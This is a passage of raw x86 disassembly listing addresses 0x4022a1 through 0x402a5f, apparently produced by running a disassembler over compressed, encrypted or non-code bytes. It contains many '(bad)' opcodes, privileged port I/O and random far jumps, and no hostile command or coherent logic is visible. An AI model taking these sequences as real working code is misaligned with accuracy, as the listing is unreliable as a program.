  4022a1:	int3   
  4022a2:	js     0x402260
  4022a4:	inc    edx
  4022a5:	inc    edx
  4022a6:	sti    
  4022a7:	andps  xmm1,XMMWORD PTR [edx]
  4022aa:	rol    BYTE PTR [edi-0x3b431817],cl
  4022b0:	pop    ebp
  4022b1:	call   0xa04efe68
  4022b6:	push   ebp
  4022b7:	xlat   BYTE PTR ds:[ebx]
  4022b8:	out    dx,al
  4022b9:	sub    BYTE PTR [eax-0x43],al
  4022bc:	ins    DWORD PTR es:[edi],dx
  4022bd:	dec    esi
  4022be:	sub    eax,0xe735ab46
  4022c3:	mov    WORD PTR [edi-0x7f66cda],ds
  4022c9:	aam    0x4c
  4022cb:	adc    DWORD PTR [eax],edi
  4022cd:	retf   0x2531
  4022d0:	(bad)  
  4022d1:	sahf   
  4022d2:	in     eax,0xe9
  4022d4:	call   0xe92c52d5
  4022d9:	cdq    
  4022da:	pushf  
  4022db:	pushf  
  4022dc:	ins    BYTE PTR es:[edi],dx
  4022dd:	adc    edi,DWORD PTR [edx+0x36]
  4022e0:	cdq    
  4022e1:	xchg   ah,al
  4022e3:	sbb    eax,0xf5fe57ec
  4022e8:	daa    
  4022e9:	adc    BYTE PTR [ebp-0x51],bh
  4022ec:	outs   dx,BYTE PTR ds:[esi]
  4022ed:	aad    0x4
  4022ef:	shl    DWORD PTR [ebx],cl
  4022f1:	mov    BYTE PTR [esi],0xb6
  4022f4:	sbb    eax,DWORD PTR [eax-0x1ccdc4be]
  4022fa:	outs   dx,DWORD PTR ds:[esi]
  4022fb:	push   edx
  4022fc:	mov    ds:0x81716ddf,eax
  402301:	jnp    0x40231c
  402303:	cwde   
  402304:	pushf  
  402305:	icebp  
  402306:	cmp    edi,DWORD PTR [ebp+0x2c]
  402309:	mul    BYTE PTR [ecx]
  40230b:	cld    
  40230c:	mov    ch,0x9f
  40230e:	pop    ss
  40230f:	pop    edx
  402310:	mov    dh,0xda
  402312:	jmp    0x402347
  402314:	repnz shl DWORD PTR [ecx+ebp*8+0x2e],1
  402319:	cwde   
  40231a:	and    dl,BYTE PTR ds:0x66cb000a
  402320:	pop    ecx
  402321:	popa   
  402322:	mov    ecx,0x8609c349
  402327:	jno    0x4022d5
  402329:	or     eax,0x90d5e116
  40232e:	es fs xchg esp,eax
  402331:	cmp    bl,0x9e
  402334:	call   DWORD PTR [ecx+0x2789e219]
  40233a:	stc    
  40233b:	sub    al,0x5b
  40233d:	jge    0x402353
  40233f:	in     al,dx
  402340:	stos   BYTE PTR es:[edi],al
  402341:	daa    
  402342:	in     al,0x6a
  402344:	mov    dl,0x7b
  402346:	jg     0x4022e5
  402348:	add    eax,0xa512a70c
  40234d:	lods   al,BYTE PTR ds:[esi]
  40234e:	pop    ebp
  40234f:	push   cs
  402350:	fisubr WORD PTR [di+0x2]
  402354:	jnp    0x402344
  402356:	adc    eax,0x1c93b0fb
  40235b:	(bad)  
  40235d:	pop    esp
  40235e:	fsub   QWORD PTR [esp+ebx*4+0x5db32ee2]
  402365:	stos   BYTE PTR es:[edi],al
  402366:	scas   al,BYTE PTR es:[edi]
  402367:	leave  
  402368:	sub    DWORD PTR [esi],eax
  40236a:	(bad)  
  40236b:	outs   dx,DWORD PTR ds:[esi]
  40236c:	aad    0x6e
  40236e:	push   0xffffffcc
  402370:	dec    edx
  402371:	inc    eax
  402372:	sbb    eax,0xbd72f6b5
  402377:	pop    es
  402378:	dec    eax
  402379:	mov    dh,0x77
  40237b:	sub    BYTE PTR [edx+esi*2],0x9e
  40237f:	mov    esp,0x19ae92fc
  402384:	cdq    
  402385:	or     eax,0x566d2f9e
  40238a:	data16 fimul WORD PTR [esi+0x19]
  40238e:	sub    eax,0xcc43dbc3
  402393:	retf   0x46f1
  402396:	push   cs
  402397:	sub    eax,0x7da6e56e
  40239c:	mov    bh,0x93
  40239e:	loopne 0x4023de
  4023a0:	push   ebp
  4023a1:	out    0x16,al
  4023a3:	imul   edx,DWORD PTR [ebx-0x39],0x89161278
  4023aa:	fs in  eax,0xf5
  4023ad:	mov    dl,bl
  4023af:	in     al,dx
  4023b0:	iret   
  4023b1:	push   esi
  4023b2:	inc    edi
  4023b3:	sbb    eax,0x52279be6
  4023b8:	fcmovbe st,st(0)
  4023ba:	fcomp  DWORD PTR [ebx+0x79]
  4023bd:	aad    0xb0
  4023bf:	fpatan 
  4023c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023c3:	xchg   ecx,eax
  4023c5:	xor    eax,esp
  4023c7:	jg     0x402376
  4023c9:	inc    esp
  4023ca:	sub    eax,0x62df7d01
  4023cf:	mov    edx,0xd20f063b
  4023d4:	mov    eax,ds:0x2f42e004
  4023d9:	clc    
  4023da:	xchg   BYTE PTR [esi-0x124fe88a],ah
  4023e0:	leave  
  4023e1:	out    dx,al
  4023e2:	push   edi
  4023e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023e4:	fs mov edi,edx
  4023e7:	gs pop esp
  4023e9:	sub    bh,dh
  4023eb:	and    BYTE PTR [edx],al
  4023ed:	inc    ebx
  4023ee:	push   edi
  4023ef:	out    0x7f,al
  4023f1:	push   ecx
  4023f2:	add    dh,BYTE PTR [edi]
  4023f4:	cmp    edx,DWORD PTR [edi+0x48ff1182]
  4023fa:	inc    edi
  4023fb:	adc    eax,0x469e2a22
  402400:	in     eax,dx
  402401:	push   esi
  402402:	addr16 xchg ebx,eax
  402404:	ins    DWORD PTR es:[edi],dx
  402405:	dec    edi
  402406:	js     0x4023b2
  402408:	xchg   edi,eax
  402409:	lds    esp,FWORD PTR [ebx+0x7580df7f]
  40240f:	retf   
  402410:	cwde   
  402411:	mov    ds:0xe8ec46d8,eax
  402416:	scas   eax,DWORD PTR es:[edi]
  402417:	jle    0x402441
  402419:	jmp    0x9aa9b48f
  40241e:	add    bh,BYTE PTR [eax]
  402420:	and    eax,0xe435ba3b
  402425:	clc    
  402426:	pop    eax
  402427:	(bad)  
  402428:	push   0xb67e42eb
  40242d:	add    edi,DWORD PTR [edi]
  40242f:	fidivr WORD PTR [eax]
  402431:	inc    edx
  402432:	xchg   esp,eax
  402433:	push   es
  402434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402435:	test   al,0xac
  402437:	inc    ebx
  402438:	xor    bl,cl
  40243a:	pop    esp
  40243b:	and    BYTE PTR [eax-0x5],ch
  40243e:	pop    esp
  40243f:	push   es
  402440:	xchg   edi,eax
  402441:	scas   eax,DWORD PTR es:[edi]
  402442:	adc    al,0xad
  402444:	not    BYTE PTR [eax+eax*8+0x667ba6ef]
  40244b:	ja     0x402449
  40244d:	add    ecx,esi
  40244f:	xchg   esi,eax
  402450:	sub    DWORD PTR [ebx],ebx
  402452:	or     edx,edx
  402454:	push   ecx
  402455:	div    BYTE PTR [esi]
  402457:	out    dx,al
  402458:	sbb    edi,DWORD PTR [ebx*2+0x1f96be4c]
  40245f:	xchg   ecx,eax
  402460:	outs   dx,DWORD PTR ds:[esi]
  402461:	fisttp QWORD PTR [esi]
  402463:	sahf   
  402464:	(bad)  
  402465:	cwde   
  402466:	pop    esp
  402467:	into   
  402468:	dec    ecx
  402469:	retf   0x9f3f
  40246c:	outs   dx,BYTE PTR ds:[esi]
  40246d:	stos   BYTE PTR es:[edi],al
  40246e:	xchg   esp,eax
  40246f:	div    BYTE PTR [edx]
  402471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402472:	xchg   ebx,eax
  402473:	sahf   
  402474:	dec    eax
  402475:	sub    al,ch
  402477:	neg    ecx
  402479:	(bad)  
  40247a:	pop    fs
  40247c:	inc    esi
  40247d:	and    al,dl
  40247f:	or     BYTE PTR [esi-0x36],al
  402482:	ja     0x402434
  402484:	sbb    esi,esp
  402486:	and    eax,0xce131c40
  40248b:	and    al,dl
  40248d:	mov    eax,ds:0x391e37ce
  402492:	lea    edi,[ebp-0x2181a31a]
  402498:	mov    esi,0x86723e69
  40249d:	mov    cl,0x46
  40249f:	es movq mm5,mm4
  4024a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024a4:	jne    0x40247d
  4024a6:	sbb    cl,al
  4024a8:	and    ebx,eax
  4024aa:	pop    ss
  4024ab:	ror    BYTE PTR [ebp+0x1749d2f9],1
  4024b1:	out    dx,eax
  4024b2:	ret    0x2e06
  4024b5:	jmp    0x2ef9dc7c
  4024ba:	and    dl,bh
  4024bc:	or     eax,0x4e3a66b6
  4024c1:	mov    WORD PTR [eax-0x566755d2],gs
  4024c7:	sar    BYTE PTR [eax],cl
  4024c9:	add    eax,0xd584b807
  4024ce:	lock sub eax,ebx
  4024d1:	cmp    BYTE PTR [eax-0x7cea760b],dh
  4024d7:	sub    esp,DWORD PTR [ebx+0x7f4c3aff]
  4024dd:	sub    DWORD PTR [edx-0x57a1b917],edx
  4024e3:	std    
  4024e4:	xor    bh,BYTE PTR [edx-0x73]
  4024e7:	les    edx,FWORD PTR [edx]
  4024e9:	aam    0xaa
  4024eb:	xor    DWORD PTR [edi],eax
  4024ed:	loop   0x4024c0
  4024ef:	fisttp DWORD PTR gs:[ecx-0x3eae4122]
  4024f6:	in     eax,0xf7
  4024f8:	out    0xa1,al
  4024fa:	sbb    BYTE PTR [ebx-0x5141d9bf],cl
  402500:	mov    WORD PTR [ecx-0x71],gs
  402503:	test   BYTE PTR [ecx-0x2b5661c5],bh
  402509:	js     0x4024a5
  40250b:	call   0xd49f:0x4f6fcd74
  402512:	clc    
  402513:	and    eax,0xa9572ebb
  402518:	jo     0x402527
  40251a:	push   edi
  40251b:	test   al,0xda
  40251d:	popf   
  40251e:	xchg   DWORD PTR [edi],edi
  402520:	aam    0xf4
  402522:	sahf   
  402523:	mov    edi,0x192b8801
  402528:	daa    
  402529:	out    dx,al
  40252a:	icebp  
  40252b:	test   BYTE PTR [eax+0x69],ch
  40252e:	xchg   esi,eax
  40252f:	mov    WORD PTR [esi+0x37],?
  402532:	lea    edi,[edx]
  402534:	gs loopne 0x40250d
  402537:	mov    edi,0xc35c5952
  40253c:	sar    BYTE PTR [ecx-0x65],cl
  40253f:	(bad)  
  402540:	and    BYTE PTR [edi+0x3a],ch
  402543:	jge    0x4024fa
  402545:	fimul  WORD PTR ds:0xa7ca3a1f
  40254b:	jo     0x4025b9
  40254d:	mov    al,ds:0x25ea5120
  402552:	sub    esp,esp
  402554:	dec    ebx
  402555:	adc    ebp,ebx
  402557:	dec    edi
  402558:	xor    al,0xfb
  40255a:	icebp  
  40255b:	mov    bl,0x84
  40255d:	cmp    BYTE PTR [ebx-0x12],ch
  402560:	adc    DWORD PTR ds:0xf3c4ac15,esi
  402566:	arpl   WORD PTR [edx+0x6f63be18],si
  40256c:	jp     0x40257f
  40256e:	and    ah,BYTE PTR [ecx-0x1e]
  402571:	xor    BYTE PTR [ebx],al
  402573:	std    
  402574:	mov    al,ds:0xbb0b048f
  402579:	mov    bl,0x86
  40257b:	add    bl,BYTE PTR [ebp+0x20]
  40257e:	ss je  0x40251b
  402581:	and    esp,DWORD PTR [ebp+0x672d3f04]
  402587:	adc    cl,BYTE PTR [ebx]
  402589:	or     eax,0x9508be57
  40258e:	clc    
  40258f:	test   BYTE PTR [esi-0x63],bl
  402592:	or     dh,BYTE PTR [ebx+0x85bec8a]
  402598:	ins    BYTE PTR es:[edi],dx
  402599:	out    0x79,eax
  40259b:	push   esi
  40259c:	leave  
  40259d:	sbb    dl,BYTE PTR [edx-0x13]
  4025a0:	aam    0x9
  4025a2:	push   0x951ae674
  4025a7:	push   esi
  4025a8:	dec    ebp
  4025a9:	add    eax,0x1614a07e
  4025ae:	push   edx
  4025af:	jmp    0x75f5:0xd2606b38
  4025b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025b7:	outs   dx,DWORD PTR ds:[esi]
  4025b8:	in     eax,dx
  4025b9:	pop    eax
  4025ba:	mov    esp,0xe0f0ff19
  4025bf:	inc    edx
  4025c0:	jnp    0x402566
  4025c2:	cmc    
  4025c3:	xchg   esp,eax
  4025c4:	sub    BYTE PTR [edi-0x5517a525],bl
  4025ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025cb:	adc    al,0xbb
  4025cd:	cwde   
  4025ce:	xor    DWORD PTR [eax+0x10eada8b],edi
  4025d4:	lock dec ebp
  4025d6:	or     eax,0x8e6e4b33
  4025db:	aam    0x11
  4025dd:	mov    al,ds:0x17db532
  4025e2:	xor    eax,0xc609615d
  4025e7:	test   eax,0x954e9fbe
  4025ec:	stos   DWORD PTR es:[edi],eax
  4025ed:	mov    bl,0x39
  4025ef:	or     BYTE PTR [edi+ebp*2+0x6e],bh
  4025f3:	ficom  DWORD PTR [ebx+0x49]
  4025f6:	int    0xc2
  4025f8:	dec    edx
  4025f9:	cmp    eax,0xb1b98ada
  4025fe:	(bad)  
  4025ff:	inc    esi
  402600:	or     ah,al
  402602:	popa   
  402603:	fld    DWORD PTR [edx-0x1e342e24]
  402609:	retf   0xb59d
  40260c:	sbb    esi,DWORD PTR [esi-0x242920f4]
  402612:	test   BYTE PTR [ebx-0x43],ah
  402615:	dec    edi
  402616:	mov    al,ds:0x27903bac
  40261b:	test   al,0x9a
  40261d:	gs adc dh,0x60
  402621:	lahf   
  402622:	jmp    0xf5a:0x8d834975
  402629:	aam    0x88
  40262b:	int    0x7e
  40262d:	(bad)  
  40262e:	sub    ebx,DWORD PTR [eax-0x53a9852f]
  402634:	xor    ebp,DWORD PTR [edx+ebp*4]
  402637:	je     0x4026a1
  402639:	dec    ebp
  40263a:	cmc    
  40263b:	ss pushf 
  40263d:	mul    DWORD PTR [edi+0x38]
  402640:	rcl    DWORD PTR [ebx+esi*4+0x6e],cl
  402644:	shl    DWORD PTR [edx+0x4a01abd9],0x2e
  40264b:	mov    dh,0xb8
  40264d:	add    ebx,ebx
  40264f:	cmp    DWORD PTR [edx],edi
  402651:	loope  0x402667
  402653:	pop    esi
  402654:	pop    esi
  402655:	imul   ebx,DWORD PTR [eax],0x3c78e9cf
  40265b:	or     al,BYTE PTR [edx-0x21cd691b]
  402661:	mov    esp,0x6df499f
  402666:	out    0x85,eax
  402668:	(bad)  
  40266a:	stos   BYTE PTR es:[edi],al
  40266b:	cdq    
  40266c:	stc    
  40266d:	jecxz  0x402681
  40266f:	inc    esp
  402670:	mov    dl,BYTE PTR ds:0x9e0e1108
  402676:	(bad)  
  402677:	(bad)  
  402678:	test   BYTE PTR [edx-0x157a38f6],dl
  40267e:	loope  0x4026d3
  402680:	fidivr DWORD PTR [ecx-0x6c]
  402683:	in     eax,dx
  402684:	mov    cl,0xc
  402686:	xchg   esp,eax
  402687:	jmp    0xa057:0x5eec151
  40268e:	ds dec esi
  402690:	cs dec eax
  402692:	push   ebp
  402693:	nop
  402694:	idiv   BYTE PTR [ecx]
  402696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402697:	aam    0xaf
  402699:	and    esp,DWORD PTR [edi-0x5e62a3c7]
  40269f:	inc    ecx
  4026a0:	fs das 
  4026a2:	sbb    ebx,DWORD PTR [esi+0x4438739d]
  4026a8:	bnd es jb 0x4026da
  4026ac:	das    
  4026ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026ae:	popa   
  4026af:	(bad)  
  4026b0:	es pop edi
  4026b2:	scas   al,BYTE PTR es:[edi]
  4026b3:	mov    bh,0x8b
  4026b5:	fild   DWORD PTR [eax+0x1f]
  4026b8:	dec    edx
  4026b9:	addr16 sti 
  4026bb:	das    
  4026bc:	add    DWORD PTR [ebx+0x42],eax
  4026bf:	jmp    0xa8ec:0x4e544da6
  4026c6:	sub    BYTE PTR [edi+0x1f],0x3a
  4026ca:	sti    
  4026cb:	mov    bh,0x8b
  4026cd:	shl    dh,1
  4026cf:	cmp    ah,BYTE PTR ds:0x86bd77f5
  4026d5:	mov    edx,DWORD PTR [ebp-0x7e]
  4026d8:	mov    bh,0x61
  4026da:	stos   DWORD PTR es:[edi],eax
  4026db:	xor    esp,eax
  4026dd:	ja     0x402709
  4026df:	shl    BYTE PTR [esi-0x69],0xd6
  4026e3:	jmp    0x5ced:0x57479d1f
  4026ea:	jmp    0x402685
  4026ec:	push   0xffffff8e
  4026ee:	imul   ebx,DWORD PTR [esi-0x74],0xfffffffe
  4026f2:	dec    esp
  4026f3:	sbb    al,0x9b
  4026f5:	push   ecx
  4026f6:	sub    al,BYTE PTR [eax+0x497026ac]
  4026fc:	xor    BYTE PTR [eax-0x43],bh
  4026ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402700:	push   0x1b0e6b1b
  402705:	(bad)  
  402706:	int    0x26
  402708:	push   edi
  402709:	dec    esp
  40270a:	jmp    0x70:0x1ffbfafe
  402711:	sub    dl,BYTE PTR [eax-0x74366a5f]
  402717:	push   ss
  402718:	es mov bl,0xd8
  40271b:	adc    DWORD PTR [ebp-0x4c8a4d65],0xd719bdba
  402725:	add    ch,0x5f
  402728:	test   BYTE PTR [edi+0x3d],0xf8
  40272c:	mov    cl,0x3
  40272e:	nop
  40272f:	xchg   DWORD PTR [edi+0x71],esi
  402732:	rep ins BYTE PTR es:[edi],dx
  402734:	dec    ebx
  402735:	hlt    
  402736:	jae    0x4026cc
  402738:	dec    esi
  402739:	sbb    al,0x1
  40273b:	add    ecx,edx
  40273d:	sub    ebx,DWORD PTR [edi]
  40273f:	jns    0x4026d9
  402741:	out    0x0,al
  402743:	loopne 0x40277b
  402745:	cs int3 
  402747:	jo     0x40276a
  402749:	daa    
  40274a:	repnz gs push edx
  40274d:	jo     0x402708
  40274f:	and    bl,dh
  402751:	cs scas eax,DWORD PTR es:[edi]
  402753:	xchg   BYTE PTR [ebx+0x2f],ah
  402756:	cli    
  402757:	mul    DWORD PTR [eax]
  402759:	push   ds
  40275a:	push   esi
  40275b:	fdiv   st(0),st
  40275d:	pop    esp
  40275e:	mov    ds:0x57023810,eax
  402763:	cmc    
  402764:	mov    ds:0xcd24d124,al
  402769:	test   BYTE PTR [edi-0x77a163e3],dl
  40276f:	and    DWORD PTR [esi+ebp*8+0x6],edi
  402773:	jp     0x4026fd
  402775:	cmp    al,0xb0
  402777:	and    ebx,ebp
  402779:	fimul  DWORD PTR [eax]
  40277b:	loopne 0x4027f5
  40277d:	ret    0xa08e
  402780:	pop    ds
  402781:	int    0x34
  402783:	mov    bl,0xb6
  402785:	adc    DWORD PTR [edx+0x3aab1e82],esp
  40278b:	cmp    eax,0x387cc3d7
  402790:	mov    edx,DWORD PTR [edx-0x69c6f475]
  402796:	dec    esp
  402798:	mov    cl,0x59
  40279a:	out    dx,al
  40279b:	or     esp,DWORD PTR [edx+0x79]
  40279e:	jecxz  0x4027e3
  4027a0:	xor    BYTE PTR [edx],bh
  4027a2:	push   0xfffffff9
  4027a4:	mov    dl,0x3a
  4027a6:	arpl   WORD PTR [edi],sp
  4027a8:	push   esp
  4027a9:	scas   eax,DWORD PTR es:[edi]
  4027aa:	jg     0x402826
  4027ac:	xchg   ecx,eax
  4027ad:	add    al,0xe9
  4027af:	mov    esp,DWORD PTR [ebp-0x73b3e1ae]
  4027b5:	aaa    
  4027b6:	stos   BYTE PTR es:[edi],al
  4027b7:	pop    ecx
  4027b8:	popf   
  4027b9:	jo     0x40283a
  4027bb:	out    dx,al
  4027bc:	aad    0xce
  4027be:	push   ebx
  4027bf:	fucomp st(0)
  4027c1:	int    0x34
  4027c3:	loope  0x4027c8
  4027c5:	inc    ecx
  4027c6:	push   edi
  4027c7:	xchg   edx,eax
  4027c8:	das    
  4027c9:	xchg   ebp,eax
  4027ca:	rcr    BYTE PTR fs:[ecx+0x4c],cl
  4027ce:	jg     0x4027f8
  4027d0:	dec    ebx
  4027d1:	(bad)  
  4027d2:	fistp  DWORD PTR [ebx+edx*2-0x72]
  4027d6:	outs   dx,BYTE PTR ds:[esi]
  4027d7:	mov    BYTE PTR [ecx],bh
  4027d9:	cwde   
  4027da:	and    dl,BYTE PTR [ebp-0xd47da7c]
  4027e0:	adc    eax,DWORD PTR [ecx]
  4027e2:	push   eax
  4027e3:	or     eax,0x2c0cca68
  4027e8:	push   edi
  4027e9:	loope  0x402857
  4027eb:	inc    ebp
  4027ec:	cmp    al,0x7a
  4027ee:	adc    ebp,edi
  4027f0:	pop    ebx
  4027f1:	leave  
  4027f2:	adc    eax,0xcf494b78
  4027f7:	adc    eax,0xf3d0e722
  4027fc:	ss ret 
  4027fe:	sub    al,0x7a
  402800:	inc    ebx
  402801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402802:	ds xchg ebp,eax
  402804:	push   esi
  402805:	ror    BYTE PTR [edx+eiz*2-0x68],1
  402809:	pop    edx
  40280a:	stc    
  40280b:	(bad)  [ecx-0x5e8e778c]
  402811:	jbe    0x402825
  402813:	aam    0x68
  402815:	and    eax,0x201552c7
  40281a:	jl     0x402877
  40281c:	sti    
  40281d:	jbe    0x4027ce
  40281f:	cs enter 0x8a00,0xeb
  402824:	ror    esi,1
  402826:	inc    edx
  402827:	mov    edi,0xdc0f41fd
  40282c:	(bad)  
  40282d:	popf   
  40282e:	sbb    DWORD PTR ds:0x98d49b5,ebx
  402834:	jle    0x4027cb
  402836:	sbb    cl,BYTE PTR [ecx+0x369f4975]
  40283c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40283d:	jns    0x4028b6
  40283f:	push   edx
  402840:	int3   
  402841:	pop    esp
  402842:	jge    0x402819
  402844:	gs add al,0x32
  402847:	mov    ebx,0xce5903c7
  40284c:	cdq    
  40284d:	iret   
  40284e:	dec    ebp
  40284f:	ss sbb al,0x24
  402852:	(bad)  
  402853:	(bad)  
  402854:	mov    edx,0xd68a9ea3
  402859:	loopne 0x40289b
  40285b:	jmp    0x40289f
  40285d:	inc    edx
  40285e:	pop    eax
  40285f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402860:	pop    ebx
  402861:	arpl   ax,si
  402863:	int    0x9f
  402865:	jno    0x402870
  402867:	jns    0x40283c
  402869:	clc    
  40286a:	jg     0x40289a
  40286c:	inc    edx
  40286d:	call   FWORD PTR [edi+edi*8]
  402870:	loopne 0x402865
  402872:	lahf   
  402873:	or     DWORD PTR [ebx],0x6cb31f37
  402879:	xor    edx,ebp
  40287b:	xchg   esi,eax
  40287c:	rcr    BYTE PTR [edi],0x49
  40287f:	sbb    DWORD PTR [eax+eiz*8-0x46],eax
  402883:	ror    ecx,cl
  402885:	fiadd  DWORD PTR ds:0x4c6f9135
  40288b:	inc    ebx
  40288c:	retf   0xed9b
  40288f:	out    0x84,al
  402891:	les    edi,FWORD PTR [esi]
  402893:	jmp    0x4028cf
  402895:	stos   BYTE PTR es:[edi],al
  402896:	imul   eax,DWORD PTR [ebp+eiz*1+0x7dd30cf8],0x33
  40289e:	push   esi
  40289f:	out    0x5d,al
  4028a1:	dec    ebp
  4028a2:	cs iret 
  4028a4:	add    BYTE PTR [esi+0xcb4605d],0x12
  4028ab:	out    0x94,al
  4028ad:	cmp    esi,DWORD PTR [esi]
  4028af:	mov    BYTE PTR gs:[edi+0x507397f0],dh
  4028b6:	pop    ebx
  4028b7:	lods   al,BYTE PTR ds:[esi]
  4028b8:	imul   eax,DWORD PTR [ebp+0x71],0xcaaff21c
  4028bf:	xchg   edx,eax
  4028c0:	lds    ecx,FWORD PTR [edi]
  4028c2:	mov    BYTE PTR [esi-0x128ed094],ch
  4028c8:	cld    
  4028c9:	lods   eax,DWORD PTR ds:[esi]
  4028ca:	push   0xc7053493
  4028cf:	dec    edi
  4028d0:	les    esi,FWORD PTR [esi-0x64]
  4028d3:	repz mov edi,0x2b26b5a0
  4028d9:	test   eax,0xd70da17e
  4028de:	add    ebx,esp
  4028e0:	popf   
  4028e1:	xchg   edi,eax
  4028e2:	adc    ch,BYTE PTR [esi]
  4028e4:	xor    ecx,DWORD PTR [ecx-0x4ca88308]
  4028ea:	rcl    ch,1
  4028ec:	ja     0x40294b
  4028ee:	xor    al,0x9
  4028f0:	fidiv  WORD PTR [ecx-0x6cc10d62]
  4028f6:	sub    ah,dl
  4028f8:	mov    al,ds:0x2f19efd7
  4028fd:	fisubr DWORD PTR [ebx-0x4e]
  402900:	add    eax,0xda6c19ea
  402905:	(bad)  
  402906:	std    
  402907:	pop    es
  402908:	mov    ebx,0x3f8a7249
  40290d:	into   
  40290e:	iret   
  40290f:	test   al,0x9f
  402911:	aad    0x65
  402913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402914:	jnp    0x40290f
  402916:	xlat   BYTE PTR ds:[ebx]
  402917:	and    eax,0xf8d68356
  40291c:	mov    DWORD PTR [edi],edx
  40291e:	or     DWORD PTR [edx-0x5a0a4b54],edx
  402924:	fimul  DWORD PTR [esi]
  402926:	mov    ecx,DWORD PTR [ebx-0x30eda31]
  40292c:	jne    0x4028ca
  40292e:	mov    ebp,0x8018a176
  402933:	icebp  
  402934:	cmp    al,0xf9
  402936:	mov    edi,0x860174ad
  40293b:	and    dh,BYTE PTR [edi+0x26]
  40293e:	ins    DWORD PTR es:[edi],dx
  40293f:	push   0xdeb19bff
  402944:	jmp    0x5868695f
  402949:	gs scas al,BYTE PTR es:[edi]
  40294b:	popf   
  40294c:	loop   0x402957
  40294e:	sbb    DWORD PTR [edx-0x77],ebx
  402951:	pusha  
  402952:	mov    esp,eax
  402954:	(bad)  
  402956:	call   0xe7b0:0x5185564b
  40295d:	pop    es
  40295e:	(bad)  
  40295f:	cld    
  402960:	jl     0x40290d
  402962:	test   dl,cl
  402964:	cmp    edx,DWORD PTR [edx+edx*2+0x678bdb23]
  40296b:	cmp    BYTE PTR [edx+0x64],dl
  40296e:	retf   
  40296f:	sub    DWORD PTR [ebp+0x2bb8a1db],edx
  402975:	outs   dx,BYTE PTR ds:[esi]
  402976:	out    0x3f,al
  402978:	dec    esi
  402979:	sub    eax,0x466809c7
  40297e:	mov    ecx,0x694f12e6
  402983:	mov    edi,0xf7ecde52
  402988:	inc    eax
  402989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40298a:	mov    DWORD PTR [edx-0x57],esi
  40298d:	push   ss
  40298e:	rcr    BYTE PTR [edi],0x64
  402991:	repz sti 
  402993:	mov    dh,0x3a
  402995:	(bad)  
  402996:	popa   
  402997:	rol    edx,0x7a
  40299a:	les    ebx,FWORD PTR [edi]
  40299c:	xchg   edx,eax
  40299d:	and    bh,BYTE PTR [ebx]
  40299f:	pusha  
  4029a0:	mov    WORD PTR [ebx+eiz*2+0x36778a4],ss
  4029a7:	sbb    ch,BYTE PTR [edi+esi*4]
  4029aa:	std    
  4029ab:	bound  ecx,QWORD PTR [edx]
  4029ad:	aad    0x98
  4029af:	sar    DWORD PTR [esi+0x2258c83f],0xfb
  4029b6:	and    al,0xff
  4029b8:	adc    DWORD PTR [esi-0x5a],esp
  4029bb:	mov    dl,0x73
  4029bd:	je     0x402969
  4029bf:	mov    esi,0xe0488e3f
  4029c4:	hlt    
  4029c5:	jmp    0x7720:0x82a31af5
  4029cc:	add    BYTE PTR [eax],ch
  4029ce:	hlt    
  4029cf:	mov    ?,WORD PTR [eax+0x6bad4965]
  4029d5:	adc    DWORD PTR [ecx+edx*4-0x29],edi
  4029d9:	xlat   BYTE PTR ds:[ebx]
  4029da:	sub    eax,0x8b3e0091
  4029df:	popa   
  4029e0:	in     eax,0x5e
  4029e2:	fimul  WORD PTR [edx]
  4029e4:	inc    ecx
  4029e5:	mov    eax,0x4caaf8ea
  4029ea:	data16 (bad) [esi-0x16]
  4029ee:	mov    eax,0x5bfffc93
  4029f3:	mov    al,ds:0x8aae5248
  4029f8:	or     BYTE PTR [edi],dh
  4029fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029fb:	retf   
  4029fc:	dec    eax
  4029fd:	jg     0x402a5f
  4029ff:	ret    0x7a0e
  402a02:	pop    es
  402a03:	xchg   ebp,eax
  402a04:	and    BYTE PTR [edi],al
  402a06:	mov    dh,0xe1
  402a08:	xor    ebx,DWORD PTR [eax]
  402a0a:	xchg   ebp,eax
  402a0b:	aad    0xcc
  402a0d:	sbb    ch,BYTE PTR [edi]
  402a0f:	pop    esp
  402a10:	scas   al,BYTE PTR es:[edi]
  402a11:	mov    ch,0x8c
  402a13:	push   ecx
  402a14:	add    eax,0x51cc694
  402a19:	cld    
  402a1a:	aad    0xc2
  402a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a1d:	cdq    
  402a1e:	fstp   QWORD PTR [edx]
  402a20:	push   ss
  402a21:	das    
  402a22:	icebp  
  402a23:	scas   eax,DWORD PTR es:[edi]
  402a24:	inc    edx
  402a25:	jecxz  0x402a9c
  402a27:	inc    edx
  402a28:	or     DWORD PTR [eax-0x4c],esi
  402a2b:	inc    edi
  402a2c:	in     eax,dx
  402a2d:	cmp    dh,dl
  402a2f:	fsub   DWORD PTR [ebx]
  402a31:	shl    esp,1
  402a33:	inc    ecx
  402a34:	jno    0x4029fd
  402a36:	(bad)  
  402a38:	repz mov ch,0x5e
  402a3b:	mov    eax,ds:0x90c9cd32
  402a40:	cmp    ecx,ebx
  402a42:	inc    edi
  402a43:	fmul   QWORD PTR [esi]
  402a45:	(bad)  
  402a46:	cwde   
  402a47:	and    al,0xb9
  402a49:	stos   DWORD PTR es:[edi],eax
  402a4a:	retf   
  402a4b:	and    DWORD PTR [edx+ebx*2],eax
  402a4e:	inc    BYTE PTR [ebp+ecx*8+0x21d0fbe]
  402a55:	push   es
  402a56:	cmc    
  402a57:	loopne 0x402a50
  402a59:	inc    esp
  402a5a:	cmp    eax,0x8732d887
  402a5f:	ja     0x402a6b
